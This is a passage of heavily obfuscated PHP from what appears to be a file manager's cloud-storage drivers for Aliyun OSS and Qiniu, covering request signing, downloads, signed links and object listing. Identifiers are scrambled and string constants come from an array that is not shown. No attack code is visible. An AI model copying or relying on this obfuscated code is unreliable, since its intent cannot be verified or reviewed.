$Ñë…—µÅ =& $_SERVER[¼’ç§¼´]; $Ğ±õòì° = $àĞ¼²§´[$Ñë…—µÅ[97]]; $ò”»ÚÚ· = $this->_getUploadAuth($Ğ±õòì°, $àĞ¼²§´); $üŠÂÁÅ´ = array($Ñë…—µÅ[288] => $ò”»ÚÚ·[$Ñë…—µÅ[288]], $Ñë…—µÅ[284] => $ò”»ÚÚ·[$Ñë…—µÅ[284]]); if (isset($ò”»ÚÚ·[$Ñë…—µÅ[1504]])) { $üŠÂÁÅ´[$Ñë…—µÅ[1504]] = $ò”»ÚÚ·[$Ñë…—µÅ[1504]]; } return $üŠÂÁÅ´; } private function uploadListAuth($ØÑ–£Ú©, $ıß½œ’ = array()) { $Œ¥©¿ â =& $_SERVER[¼’ç§¼´]; $Î –˜òÆ = $ıß½œ’[$Œ¥©¿ â[97]]; $Î©—ˆ¼· = $ıß½œ’[$Œ¥©¿ â[283]]; $Âã·ô¥´ = $this->client->listParts($this->bucket, $this->pathEncode($Î –˜òÆ), $Î©—ˆ¼·); $éÚîÕÆõ = $Âã·ô¥´->getListPart(); $ªÀÅÀÅ = array(); foreach ($éÚîÕÆõ as $€µ º‹) { $ªÀÅÀÅ[] = array($Œ¥©¿ â[299] => $€µ º‹->getPartNumber(), $Œ¥©¿ â[300] => trim($€µ º‹->getETag(), $Œ¥©¿ â[121])); } if (!$ªÀÅÀÅ) { return !1; } $±ØóĞú = $this->_getUploadAuth($Î –˜òÆ, $ıß½œ’); return array($Œ¥©¿ â[288] => $±ØóĞú[$Œ¥©¿ â[288]], $Œ¥©¿ â[284] => $±ØóĞú[$Œ¥©¿ â[284]], $Œ¥©¿ â[291] => $ªÀÅÀÅ); } private function _getUploadAuth($Îô€ƒ•Ù, $µ¶‰ÉÈê) { $İ´‰¿ø» =& $_SERVER[¼’ç§¼´]; $±¢¿–æ = gmdate($İ´‰¿ø»[1503]); $ŞÊøüÃÂ = isset($µ¶‰ÉÈê[$İ´‰¿ø»[285]]) ? $İ´‰¿ø»[255] : $İ´‰¿ø»[290]; $ˆÜ©ş’æ = array_intersect_key($µ¶‰ÉÈê, array_flip(array($İ´‰¿ø»[285], $İ´‰¿ø»[283]))); ksort($ˆÜ©ş’æ); $µ„óÏÑ = $ˆÜ©ş’æ ? $İ´‰¿ø»[76] . http_build_query($ˆÜ©ş’æ, null, $İ´‰¿ø»[286], PHP_QUERY_RFC3986) : $İ´‰¿ø»[12]; $»Â”Šæ¸ = array($ŞÊøüÃÂ, $İ´‰¿ø»[12], $İ´‰¿ø»[123], $±¢¿–æ, "\x78\x2d\x6f\163\x73\55\x64\141\164\145\72{$±¢¿–æ}", $İ´‰¿ø»[8] . $this->bucket . $İ´‰¿ø»[8] . $Îô€ƒ•Ù . $µ„óÏÑ); if (isset($µ¶‰ÉÈê[$İ´‰¿ø»[285]])) { $¸³¥Ş÷ = $this->trafficLimit($İ´‰¿ø»[1496], array(), !0); if ($¸³¥Ş÷) { $Îô€ƒ•Ù = $İ´‰¿ø»[1504]; array_splice($»Â”Šæ¸, 5, 0, $Îô€ƒ•Ù . $İ´‰¿ø»[4] . $¸³¥Ş÷[$Îô€ƒ•Ù]); } } $°ãÃù‡à = implode($İ´‰¿ø»[287], $»Â”Šæ¸); $«¶éŸ‘¤ = base64_encode(hash_hmac($İ´‰¿ø»[1421], $°ãÃù‡à, $this->secret, !0)); $»›âö¿â = $İ´‰¿ø»[1473] . $this->accessKey . $İ´‰¿ø»[4] . $«¶éŸ‘¤; $à¹¤ğ£Ê = array($İ´‰¿ø»[288] => $»›âö¿â, $İ´‰¿ø»[284] => $±¢¿–æ); if (!empty($¸³¥Ş÷)) { $à¹¤ğ£Ê = array_merge($à¹¤ğ£Ê, $¸³¥Ş÷); } return $à¹¤ğ£Ê; } public function download($¿çå€Ô, $ıß²¦Ğ) { $Ù¾Ö×é =& $_SERVER[¼’ç§¼´]; if ($this->isFolder($¿çå€Ô)) { return !1; } try { $ì£¹Û‹‡ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ıß²¦Ğ); $ì£¹Û‹‡ = $this->trafficLimit($Ù¾Ö×é[112], $ì£¹Û‹‡); $this->client->getObject($this->bucket, $this->pathEncode($¿çå€Ô), $ì£¹Û‹‡); } catch (OSS\Core\OssException $„Š˜Í¤Ì) { $this->writeLog(__FUNCTION__ . $Ù¾Ö×é[214] . $„Š˜Í¤Ì->getMessage()); return !1; } return $ıß²¦Ğ; } public function fileSubstr($…×ö°î¨, $®îúÀ = 0, $Ñî»áˆÏ = false) { if ($®îúÀ === -1) { $àŒÑÍú = array(); } else { if ($Ñî»áˆÏ === !1) { $Ø»™’Âä = $this->size($…×ö°î¨); } else { $Ø»™’Âä = $®îúÀ + $Ñî»áˆÏ - 1; } $àŒÑÍú = array(OSS\OssClient::OSS_RANGE => "{$®îúÀ}\55{$Ø»™’Âä}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($…×ö°î¨), $àŒÑÍú); } catch (OSS\Core\OssException $€€…¬‘) { $this->writeLog(__FUNCTION__ . $_SERVER[¼’ç§¼´][214] . $€€…¬‘->getMessage()); think_exception($€€…¬‘->getMessage()); return !1; } } private function trafficLimit($°àÑ˜¨ù, $ü€²›òõ = array(), $¯ÃŒÒåü = false) { $…¬­Î°” =& $_SERVER[¼’ç§¼´]; if ($°àÑ˜¨ù == $…¬­Î°”[1496] && $this->isUploadServer() || $°àÑ˜¨ù == $…¬­Î°”[112] && $this->isFileOutServer()) { return $ü€²›òõ; } $‚¨¾›á = floatval($GLOBALS[$…¬­Î°”[6]][$…¬­Î°”[92]][$…¬­Î°”[110]][$°àÑ˜¨ù]) * 1024 * 1024 * 8; if (!$‚¨¾›á) { return $ü€²›òõ; } $‚¨¾›á = $‚¨¾›á < 819200 ? 819200 : ($‚¨¾›á > 838860800 ? 838860800 : $‚¨¾›á); if ($¯ÃŒÒåü) { $ü€²›òõ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‚¨¾›á); } else { if (!isset($ü€²›òõ[OSS\OssClient::OSS_HEADERS])) { $ü€²›òõ[OSS\OssClient::OSS_HEADERS] = array(); } $ü€²›òõ[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($‚¨¾›á); } return $ü€²›òõ; } public function link($µîèñ²°, $Ó«¥Şíò = array()) { $ÀÂ»Ôš™ =& $_SERVER[¼’ç§¼´]; if (!$this->exist($µîèñ²°) || $this->isFolder($µîèñ²°)) { return !1; } try { $Ó«¥Şíò = $this->trafficLimit($ÀÂ»Ôš™[112], $Ó«¥Şíò, !0); $ç×°ğ©– = $this->client->signUrl($this->bucket, $this->pathEncode($µîèñ²°), 3600 * 12, $ÀÂ»Ôš™[1505], $Ó«¥Şíò); return $this->getCdnLink($ç×°ğ©–); } catch (OSS\Core\OssException $º†Şáï¼) { $this->writeLog(__FUNCTION__ . $ÀÂ»Ôš™[214] . $º†Şáï¼->getMessage()); return !1; } } public function fileOut($•Ù®Ö‹¾, $œÊĞâíæ = false, $»¶ı“á = false, $ê§Ãí¹ = '') { $Ç¶şıùß =& $_SERVER[¼’ç§¼´]; if ($this->isFileOutServer()) { return $this->fileOutServer($•Ù®Ö‹¾, $œÊĞâíæ, $»¶ı“á, $ê§Ãí¹); } if (!$»¶ı“á) { $»¶ı“á = $this->pathThis($•Ù®Ö‹¾); } $»¶ı“á = rawurlencode($»¶ı“á); $Ü‡ „ñ = get_file_mime(get_path_ext($»¶ı“á)); if ($Ü‡ „ñ == $Ç¶şıùß[250]) { return parent::fileOut($•Ù®Ö‹¾, $œÊĞâíæ, $»¶ı“á, $ê§Ãí¹); } $œÊĞâíæ = $œÊĞâíæ ? $Ç¶şıùß[1506] : $Ç¶şıùß[1507]; $û´ÃÄøÕ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ç¶şıùß[1508] . rawurlencode("{$œÊĞâíæ}\x3b\146\151\x6c\145\156\x61\155\x65\x3d{$»¶ı“á}")); $û´ÃÄøÕ[OSS\OssClient::OSS_SUB_RESOURCE] .= $Ç¶şıùß[1509] . rawurlencode($Ü‡ „ñ); $ØåùÅ±Ö = $this->link($•Ù®Ö‹¾, $û´ÃÄøÕ); $this->fileOutLink($ØåùÅ±Ö); } public function fileOutServer($Îø×şÉ, $İùÂ’¥¡ = false, $ö™İƒà = false, $İÏ¯¹ä = '') { parent::fileOut($Îø×şÉ, $İùÂ’¥¡, $ö™İƒà, $İÏ¯¹ä); } public function fileOutImage($ŞøòÙÓ, $œÇòÒ = 250) { if ($this->size($ŞøòÙÓ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ŞøòÙÓ, $œÇòÒ); } $Ú£¬Ï—ƒ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¼’ç§¼´][1470] . $œÇòÒ); $Ùøé°Î£ = $this->link($ŞøòÙÓ, $Ú£¬Ï—ƒ); $this->fileOutLink($Ùøé°Î£); } public function fileOutImageServer($”Äú„³¿, $Ûê´Êµ” = 250) { parent::fileOutImage($”Äú„³¿, $Ûê´Êµ”); } public function fileOutLink($½Ñ’œôÀ) { $ÊıÁìçî =& $_SERVER[¼’ç§¼´]; if (!$this->isCdnHost() && substr($½Ñ’œôÀ, 0, 7) == $ÊıÁìçî[218]) { $½Ñ’œôÀ = $ÊıÁìçî[219] . substr($½Ñ’œôÀ, 7); } header($ÊıÁìçî[175] . $½Ñ’œôÀ); die; } public function hashMd5($Ë’ï­Š¥, $– •í¹ì = '') { $µïªì®“ =& $_SERVER[¼’ç§¼´]; $ÇÃ•‰Æï = $this->_objectMeta($Ë’ï­Š¥); if (!$ÇÃ•‰Æï) { return $µïªì®“[12]; } if (!isset($ÇÃ•‰Æï[$µïªì®“[1490]]) && !empty($– •í¹ì)) { $Úıâ…˜ğ = $this->updateObjMeta($Ë’ï­Š¥, array($µïªì®“[1490] => $– •í¹ì)); $ÇÃ•‰Æï[$µïªì®“[1490]] = $Úıâ…˜ğ ? $– •í¹ì : $µïªì®“[12]; } return isset($ÇÃ•‰Æï[$µïªì®“[1490]]) ? strtolower($ÇÃ•‰Æï[$µïªì®“[1490]]) : $µïªì®“[12]; } public function size($ ®¶Ğ„ı) { $úüğ•Ş = $this->objectMeta($ ®¶Ğ„ı); return $úüğ•Ş ? $úüğ•Ş[$_SERVER[¼’ç§¼´][79]] : 0; } public function info($èú¢Ú– ) { if ($this->isFolder($èú¢Ú– )) { return $this->folderInfo($èú¢Ú– ); } else { if ($this->isFile($èú¢Ú– )) { return $this->fileInfo($èú¢Ú– ); } } return !1; } public function exist($»ÓÌê­Ú) { return $this->isFile($»ÓÌê­Ú) || $this->isFolder($»ÓÌê­Ú); } public function isFile($ÖĞ½©²) { return !$this->isFolder($ÖĞ½©²) && $this->objectMeta($ÖĞ½©²); } public function isFolder($…ç“¾) { return $this->cacheMethod($_SERVER[¼’ç§¼´][179], $…ç“¾); } protected function objectMeta($Å·Û×…) { return $this->cacheMethod($_SERVER[¼’ç§¼´][181], $Å·Û×…); } protected function _objectMeta($â‹ÑŸ×¡) { $®ÔÍ¿ªÕ =& $_SERVER[¼’ç§¼´]; try { $éÛøÇÁ¦ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($â‹ÑŸ×¡)); } catch (OSS\Core\OssException $²‰¥¶Ï”) { $this->writeLog(__FUNCTION__ . $®ÔÍ¿ªÕ[214] . $²‰¥¶Ï”->getMessage()); $éÛøÇÁ¦ = !1; } if ($éÛøÇÁ¦) { $éÛøÇÁ¦[$®ÔÍ¿ªÕ[79]] = intval($éÛøÇÁ¦[$®ÔÍ¿ªÕ[1488]]); } return $éÛøÇÁ¦; } protected function _isFolder($ºû—ÑÛæ) { $”í¨²ş£ =& $_SERVER[¼’ç§¼´]; if ($ºû—ÑÛæ == $”í¨²ş£[12] || $ºû—ÑÛæ == $”í¨²ş£[8]) { return !0; } $À¶İÑ › = array($”í¨²ş£[1483] => $”í¨²ş£[8], $”í¨²ş£[1484] => rtrim($ºû—ÑÛæ, $”í¨²ş£[8]) . $”í¨²ş£[8], $”í¨²ş£[1485] => 1, $”í¨²ş£[1486] => $”í¨²ş£[12]); $†ôùòÚ— = $this->client->listObjects($this->bucket, $À¶İÑ ›); if ($†ôùòÚ—->getObjectList() || $†ôùòÚ—->getPrefixList()) { return !0; } return !1; } public function writeLog($ÄçØ¼‰ = '', $¶¢¹Ì„Ç = false) { $Ùºûúü =& $_SERVER[¼’ç§¼´]; $„ê–Û±â = in_array(ACTION, array($Ùºûúü[212], $Ùºûúü[213])); if (!$„ê–Û±â && !GLOBAL_DEBUG) { return; } $ÄÎˆİ”Ü = 0; if (stripos($ÄçØ¼‰, $Ùºûúü[1510]) !== !1) { $ÄÎˆİ”Ü = 1; $Ñ–óÄğˆ = explode($Ùºûúü[1511], $ÄçØ¼‰); $ÄçØ¼‰ = !empty($Ñ–óÄğˆ[1]) ? $Ñ–óÄğˆ[1] : $ÄçØ¼‰; } else { if (stripos($ÄçØ¼‰, $Ùºûúü[1512])) { $ÄÎˆİ”Ü = 2; $Ñ–óÄğˆ = explode($Ùºûúü[1512], $ÄçØ¼‰); $Ñ–óÄğˆ = explode($Ùºûúü[4], $Ñ–óÄğˆ[0]); $ÄçØ¼‰ = !empty($Ñ–óÄğˆ[1]) ? $Ñ–óÄğˆ[1] : $ÄçØ¼‰; } } if ($„ê–Û±â && I18n::getType() == $Ùºûúü[1513]) { if ($ÄÎˆİ”Ü == 1) { $ÄçØ¼‰ = str_replace($Ùºûúü[1514], $Ùºûúü[1515], $ÄçØ¼‰); } else { if ($ÄÎˆİ”Ü == 2) { $Ñ–óÄğˆ = explode($Ùºûúü[214], $Ñ–óÄğˆ[0]); $®Æû­ºü = isset($Ñ–óÄğˆ[1]) ? $Ñ–óÄğˆ[1] : $Ùºûúü[12]; $™â°˜²í = array($Ùºûúü[1516] => $Ùºûúü[1517], $Ùºûúü[1518] => $Ùºûúü[1519], $Ùºûúü[1520] => $Ùºûúü[1521], $Ùºûúü[1522] => $Ùºûúü[1523], $Ùºûúü[1524] => $Ùºûúü[1525], $Ùºûúü[1526] => $Ùºûúü[1527], $Ùºûúü[1528] => $Ùºûúü[1529], $Ùºûúü[1530] => $Ùºûúü[1531], $Ùºûúü[1532] => $Ùºûúü[1533], $Ùºûúü[1534] => $Ùºûúü[1535]); if (isset($™â°˜²í[$®Æû­ºü])) { $ÄçØ¼‰ = $™â°˜²í[$®Æû­ºü]; } } } if (stripos($ÄçØ¼‰, $Ùºûúü[1536])) { $ÄçØ¼‰ = $Ùºûúü[1537]; } } if (!trim($ÄçØ¼‰)) { return; } parent::writeLog(trim($ÄçØ¼‰), $¶¢¹Ì„Ç); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ŞÑ´Ñ¤ı) { parent::__construct(); require_once SDK_DIR . $_SERVER[¼’ç§¼´][1538]; $this->_init($ŞÑ´Ñ¤ı); } public function _init($ÛÀ¿õÙà) { $¸ôºø§œ =& $_SERVER[¼’ç§¼´]; $this->config = $ÛÀ¿õÙà; foreach ($ÛÀ¿õÙà as $©«Î•¼ => $Ù³ŞÒ”) { if (isset($this->{$©«Î•¼})) { $this->{$©«Î•¼} = $Ù³ŞÒ”; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¸ôºø§œ[1539] . LNG($¸ôºø§œ[1474])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÚçŸŒí§, $¿ÂÄÓÍ´ = '', $³šÜäÄ‰ = REPEAT_RENAME) { if ($this->setContent($ÚçŸŒí§, $¿ÂÄÓÍ´)) { return $this->getPathOuter($ÚçŸŒí§); } return !1; } public function mkdir($š–ü¿ãŒ, $ëİş‘Ô = REPEAT_SKIP) { $±Š­ì¶¬ =& $_SERVER[¼’ç§¼´]; $¤åúÕÃî = trim($š–ü¿ãŒ, $±Š­ì¶¬[8]); if ($this->_isFolder($¤åúÕÃî)) { return $this->getPathOuter($¤åúÕÃî); } $š–ü¿ãŒ = $¤åúÕÃî . $±Š­ì¶¬[8]; $‘‡ù¼å… = get_path_this($¤åúÕÃî); $é´•Ğİ¢ = $š–ü¿ãŒ . $‘‡ù¼å…; if (!$this->mkfile($é´•Ğİ¢)) { return !1; } if (!$this->moveFile($é´•Ğİ¢, $š–ü¿ãŒ)) { $this->delFile($é´•Ğİ¢); return !1; } return $this->getPathOuter($¤åúÕÃî); } public function copyFile($âë¼Š, $îÔÜÀ–) { $òª€¬âš = $this->bucketManager->copy($this->bucket, $âë¼Š, $this->bucket, $îÔÜÀ–, !0); return $òª€¬âš ? !1 : $this->getPathOuter($îÔÜÀ–); } public function moveFile($´Ğ¤¹³˜, $åü‘—«ğ) { $Ãè¿º = $this->bucketManager->move($this->bucket, $´Ğ¤¹³˜, $this->bucket, $åü‘—«ğ, !0); return $Ãè¿º ? !1 : $this->getPathOuter($åü‘—«ğ); } public function delFile($øØ¥®ßĞ) { if (!$this->exist($øØ¥®ßĞ)) { return !0; } $ã•‹ÛàÛ = $this->bucketManager->delete($this->bucket, $øØ¥®ßĞ); if (!$ã•‹ÛàÛ) { return !0; } return $ã•‹ÛàÛ->code() == 612 ? !0 : !1; } public function delFolder($’îÒİé) { $‚Îó¦å =& $_SERVER[¼’ç§¼´]; if (!$this->exist($’îÒİé)) { return !0; } $this->listItemCache = !1; $ï©ëÆºå = $this->fileList($’îÒİé); $this->listItemCache = !0; $àÊú—¤ = trim($’îÒİé, $‚Îó¦å[8]) . $‚Îó¦å[8]; if (!empty($’îÒİé) && $’îÒİé !== $‚Îó¦å[230] && !in_array($àÊú—¤, $ï©ëÆºå[$‚Îó¦å[85]])) { $ï©ëÆºå[$‚Îó¦å[85]][] = $àÊú—¤; } $²œäŠÅ = $this->delByBatch($ï©ëÆºå[$‚Îó¦å[86]]); if (!$²œäŠÅ) { return !1; } $²œäŠÅ = $this->delByBatch($ï©ëÆºå[$‚Îó¦å[85]]); if (!$²œäŠÅ) { return !1; } return $this->delFile($àÊú—¤); } private function delByBatch($¸—‚Àøä) { foreach (array_chunk($¸—‚Àøä, 1000) as $ßÒßÑÑ) { $¿ù »« = $this->bucketManager->buildBatchDelete($this->bucket, $ßÒßÑÑ); list($…ÖÀÙë«, $™ôä˜†¯) = $this->bucketManager->batch($¿ù »«); if ($™ôä˜†¯) { return !1; } } return !0; } public function rename($İïæµƒ˜, $Ğ¡¾¦õ) { return $this->renameObject($İïæµƒ˜, $Ğ¡¾¦õ); } public function fileInfo($¥Çİ«Ë·, $ª—ã„­ = false, $õ¦ô€ˆç = array()) { $İè°ú…Š =& $_SERVER[¼’ç§¼´]; $âà¢ğƒ¥ = array($İè°ú…Š[32] => $this->pathThis($¥Çİ«Ë·), $İè°ú…Š[87] => $this->getPathOuter($İè°ú…Š[8] . $¥Çİ«Ë·), $İè°ú…Š[33] => $İè°ú…Š[232], $İè°ú…Š[79] => isset($õ¦ô€ˆç[$İè°ú…Š[1540]]) ? $õ¦ô€ˆç[$İè°ú…Š[1540]] : 0, $İè°ú…Š[169] => $this->ext($¥Çİ«Ë·)); if ($ª—ã„­) { return $âà¢ğƒ¥; } $âà¢ğƒ¥[$İè°ú…Š[233]] = $âà¢ğƒ¥[$İè°ú…Š[88]] = 0; $âà¢ğƒ¥[$İè°ú…Š[234]] = $âà¢ğƒ¥[$İè°ú…Š[235]] = !0; if (empty($õ¦ô€ˆç)) { $õ¦ô€ˆç = $this->objectMeta($¥Çİ«Ë·); if (!$õ¦ô€ˆç) { return $âà¢ğƒ¥; } } if (isset($õ¦ô€ˆç[$İè°ú…Š[236]]) && $õ¦ô€ˆç[$İè°ú…Š[236]]) { $âà¢ğƒ¥[$İè°ú…Š[237]] = $õ¦ô€ˆç[$İè°ú…Š[236]]; } if (isset($õ¦ô€ˆç[$İè°ú…Š[247]]) && $õ¦ô€ˆç[$İè°ú…Š[247]]) { $âà¢ğƒ¥[$İè°ú…Š[237]] = $õ¦ô€ˆç[$İè°ú…Š[247]]; } if (isset($õ¦ô€ˆç[$İè°ú…Š[1541]])) { $âà¢ğƒ¥[$İè°ú…Š[88]] = substr($õ¦ô€ˆç[$İè°ú…Š[1541]] . $İè°ú…Š[12], 0, 10); } if (isset($õ¦ô€ˆç[$İè°ú…Š[1540]])) { $âà¢ğƒ¥[$İè°ú…Š[79]] = $õ¦ô€ˆç[$İè°ú…Š[1540]]; } return $âà¢ğƒ¥; } public function folderInfo($ØÃçõáĞ, $¦ÑªóõË = false) { $ñç£°ï =& $_SERVER[¼’ç§¼´]; $‹µúîÏà = array($ñç£°ï[32] => $this->pathThis($ØÃçõáĞ), $ñç£°ï[87] => $this->getPathOuter($ñç£°ï[8] . $ØÃçõáĞ), $ñç£°ï[33] => $ñç£°ï[78]); if ($¦ÑªóõË) { return $‹µúîÏà; } $‹µúîÏà[$ñç£°ï[233]] = $‹µúîÏà[$ñç£°ï[88]] = 0; $‹µúîÏà[$ñç£°ï[234]] = $‹µúîÏà[$ñç£°ï[235]] = !0; $ØÃçõáĞ = rtrim($ØÃçõáĞ, $ñç£°ï[8]) . $ñç£°ï[8]; $¤íû†Ã = $this->objectMeta($ØÃçõáĞ); if (isset($¤íû†Ã[$ñç£°ï[1541]])) { $‹µúîÏà[$ñç£°ï[88]] = substr($¤íû†Ã[$ñç£°ï[1541]] . $ñç£°ï[12], 0, 10); } return $‹µúîÏà; } public function listPath($ëö¼µÈĞ, $î»ôÄ„Ô = false) { $Ğ‘Â©İ =& $_SERVER[¼’ç§¼´]; $¢×áùû = $this->fileList($ëö¼µÈĞ, $Ğ‘Â©İ[8], !0); foreach ($¢×áùû[$Ğ‘Â©İ[85]] as $®¬ï¥¹¿ => $çÆõ…ùÌ) { $¢×áùû[$Ğ‘Â©İ[85]][$®¬ï¥¹¿] = $this->folderInfo($çÆõ…ùÌ, $î»ôÄ„Ô); } foreach ($¢×áùû[$Ğ‘Â©İ[86]] as $®¬ï¥¹¿ => $çÆõ…ùÌ) { $¢×áùû[$Ğ‘Â©İ[86]][$®¬ï¥¹¿] = $this->fileInfo($çÆõ…ùÌ[$Ğ‘Â©İ[97]], $î»ôÄ„Ô, $çÆõ…ùÌ); } return $¢×áùû; } public function has($Æî¶¶äÁ, $ŠŞº¯¶Õ = false, $„øÈ”ïä = true) { $‹şÎ‡û¿ =& $_SERVER[¼’ç§¼´]; $Æî¶¶äÁ = trim($Æî¶¶äÁ, $‹şÎ‡û¿[8]); $óŒÔÅù‘ = empty($Æî¶¶äÁ) && $Æî¶¶äÁ !== $‹şÎ‡û¿[230] ? $‹şÎ‡û¿[12] : $Æî¶¶äÁ . $‹şÎ‡û¿[8]; $ÂõÅÀÀ = $‹şÎ‡û¿[12]; $¸Ìê¿»  = 500; $÷¨—»÷ = $‹şÎ‡û¿[8]; $Ôø…µİ‡ = $†â ùì‹ = 0; while (!0) { check_abort(); list($ş®åÉ³Ï, $İ¥öù¢Ÿ) = $this->bucketManager->listFiles($this->bucket, $óŒÔÅù‘, $ÂõÅÀÀ, $¸Ìê¿» , $÷¨—»÷); if ($İ¥öù¢Ÿ) { break; } $ÂõÅÀÀ = array_key_exists($‹şÎ‡û¿[1486], $ş®åÉ³Ï) ? $ÂõÅÀÀ = $ş®åÉ³Ï[$‹şÎ‡û¿[1542]] : $‹şÎ‡û¿[12]; if ($ŠŞº¯¶Õ) { if (!empty($ş®åÉ³Ï[$‹şÎ‡û¿[1543]])) { $Ôø…µİ‡ += count($ş®åÉ³Ï[$‹şÎ‡û¿[1543]]); } if (!empty($ş®åÉ³Ï[$‹şÎ‡û¿[1544]])) { $†â ùì‹ += count($ş®åÉ³Ï[$‹şÎ‡û¿[1544]]); } if ($ÂõÅÀÀ === $‹şÎ‡û¿[12]) { break; } continue; } if ($„øÈ”ïä) { if (!empty($ş®åÉ³Ï[$‹şÎ‡û¿[1543]])) { return !0; } } else { if (!empty($ş®åÉ³Ï[$‹şÎ‡û¿[1544]])) { return !0; } } if ($ÂõÅÀÀ === $‹şÎ‡û¿[12]) { break; } } if ($ŠŞº¯¶Õ) { return array($‹şÎ‡û¿[241] => $Ôø…µİ‡, $‹şÎ‡û¿[242] => $†â ùì‹); } return !1; } public function listAll($Óç¼ƒÉÎ) { $˜œı› ¡ =& $_SERVER[¼’ç§¼´]; $·“µÊ– = $this->fileList($Óç¼ƒÉÎ, $˜œı› ¡[12], !0); $¢»¥ëø = array_to_keyvalue($·“µÊ–[$˜œı› ¡[86]], $˜œı› ¡[32]); foreach ($·“µÊ–[$˜œı› ¡[85]] as $æÁÓ®øò) { if (is_string($æÁÓ®øò)) { $¢»¥ëø[$æÁÓ®øò] = array($˜œı› ¡[79] => 0); } } return $this->listAllFiles($Óç¼ƒÉÎ, $¢»¥ëø); } private function fileList($ï²éÈŒÇ, $¯¼“îÕ» = '', $†íó˜–« = 0) { $È®–§·Œ =& $_SERVER[¼’ç§¼´]; $ï²éÈŒÇ = trim($ï²éÈŒÇ, $È®–§·Œ[8]); $¿¾‡ùÔ‰ = empty($ï²éÈŒÇ) && $ï²éÈŒÇ !== $È®–§·Œ[230] ? $È®–§·Œ[12] : $ï²éÈŒÇ . $È®–§·Œ[8]; $Ûµ¿ü = $È®–§·Œ[12]; $ù‹“ªÆ = 1000; $±ô«Ö• = $Ì‡Û§æ– = array(); while (!0) { check_abort(); list($Ô¼û¾, $ò‹Ğ¬œ) = $this->bucketManager->listFiles($this->bucket, $¿¾‡ùÔ‰, $Ûµ¿ü, $ù‹“ªÆ, $¯¼“îÕ»); if ($ò‹Ğ¬œ) { break; } $Ûµ¿ü = array_key_exists($È®–§·Œ[1486], $Ô¼û¾) ? $Ûµ¿ü = $Ô¼û¾[$È®–§·Œ[1542]] : $È®–§·Œ[12]; $®ğÄË´ = isset($Ô¼û¾[$È®–§·Œ[1543]]) ? $Ô¼û¾[$È®–§·Œ[1543]] : array(); $Ù¾ñ°È× = isset($Ô¼û¾[$È®–§·Œ[1544]]) ? $Ô¼û¾[$È®–§·Œ[1544]] : array(); foreach ($®ğÄË´ as $»ŞÑ“„¹) { if ($»ŞÑ“„¹[$È®–§·Œ[97]] == $¿¾‡ùÔ‰) { continue; } $è°Ññèƒ = $»ŞÑ“„¹[$È®–§·Œ[97]]; $ˆÚî´Ï¾ = $»ŞÑ“„¹[$È®–§·Œ[1540]]; $»ŞÑ“„¹[$È®–§·Œ[79]] = $ˆÚî´Ï¾; $°—™şí– = $ˆÚî´Ï¾ == 0 && substr($è°Ññèƒ, strlen($è°Ññèƒ) - 1, 1) == $È®–§·Œ[8] ? !0 : !1; $this->cacheMethodInfoSet($è°Ññèƒ, $°—™şí–, $»ŞÑ“„¹); if ($°—™şí–) { $±ô«Ö•[] = $è°Ññèƒ; continue; } $Ì‡Û§æ–[] = $†íó˜–« ? $»ŞÑ“„¹ : $è°Ññèƒ; } foreach ($Ù¾ñ°È× as $è°Ññèƒ) { if ($è°Ññèƒ == $¿¾‡ùÔ‰) { continue; } $±ô«Ö•[] = $è°Ññèƒ; $this->cacheMethodInfoSet($è°Ññèƒ, !0); } if ($Ûµ¿ü === $È®–§·Œ[12]) { break; } } $this->cacheMethodInfoSet($ï²éÈŒÇ, !0); return array($È®–§·Œ[85] => $±ô«Ö•, $È®–§·Œ[86] => $Ì‡Û§æ–); } public function canRead($¢ù´éÚ) { return $this->exist($¢ù´éÚ) ? !0 : !1; } public function canWrite($à£’µ§Á) { return $this->exist($à£’µ§Á) ? !0 : !1; } public function getContent($¾†õœøØ) { return $this->fileSubstr($¾†õœøØ, 0, -1); } public function setContent($˜î¹ñ¶‘, $ÄÂéÍËÙ = '') { $’÷‘ï„Á = $this->tempFile($this->pathThis($˜î¹ñ¶‘)); file_put_contents($’÷‘ï„Á, $ÄÂéÍËÙ); if ($this->upload($˜î¹ñ¶‘, $’÷‘ï„Á)) { $this->tempFileRemve($’÷‘ï„Á); return !0; } return !1; } public function refreshUrls($…êŒ€é¯) { $İ¹ÛòÎÀ =& $_SERVER[¼’ç§¼´]; $ûÂ¹ÛË = array(); if (is_array($…êŒ€é¯)) { foreach ($…êŒ€é¯ as $½ÍÅóéù) { $ûÂ¹ÛË[] = $this->link($½ÍÅóéù); } } else { $ûÂ¹ÛË[] = $this->link($…êŒ€é¯); } $Ö€–òşÆ = new Qiniu\Cdn\CdnManager($this->auth); list($¸¦È’Àó, $˜ëÌü‘) = $Ö€–òşÆ->refreshUrls($ûÂ¹ÛË); if ($˜ëÌü‘) { return !1; } return $¸¦È’Àó[$İ¹ÛòÎÀ[1273]] == $İ¹ÛòÎÀ[847] ? !0 : !1; } public function fileSubstr($Ÿ›†á˜õ, $ù›Â‡…«, $„“åÔøØ) { $ş€ô“Ÿ‘ =& $_SERVER[¼’ç§¼´]; if (!($ÆÅÉ‘…ˆ = $this->link($Ÿ›†á˜õ))) { return !1; } $™Í–—Ì = !1; if ($„“åÔøØ > 0) { $¹á¤Ó…º = $ù›Â‡…« + $„“åÔøØ - 1; $™Í–—Ì = array($ş€ô“Ÿ‘[1545] . $ù›Â‡…« . $ş€ô“Ÿ‘[473] . $¹á¤Ó…º); } $ßò«¬ÜÖ = url_request($ÆÅÉ‘…ˆ, $ş€ô“Ÿ‘[1505], !1, $™Í–—Ì); return 